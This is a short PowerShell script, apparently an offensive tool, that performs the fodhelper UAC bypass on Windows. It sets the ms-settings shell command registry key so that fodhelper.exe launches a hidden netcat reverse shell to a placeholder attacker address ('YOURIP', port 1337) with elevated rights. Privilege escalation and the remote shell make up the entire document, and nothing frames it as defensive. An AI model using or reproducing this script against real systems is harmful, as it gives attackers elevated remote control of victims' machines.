<#
.NOTES
    Author: 0xshdax
#>

function RunCommands {
    $REG_KEY = "HKCU\Software\Classes\ms-settings\Shell\Open\command"
    $CMD = "powershell -windowstyle hidden C:\Windows\Temp\nc.exe YOURIP 1337 -e cmd"

    Set-ItemProperty -Path $REG_KEY -Name "DelegateExecute" -Value "" -Force

    Set-ItemProperty -Path $REG_KEY -Name "" -Value $CMD -Force

    Start-Process -FilePath "fodhelper.exe"
}
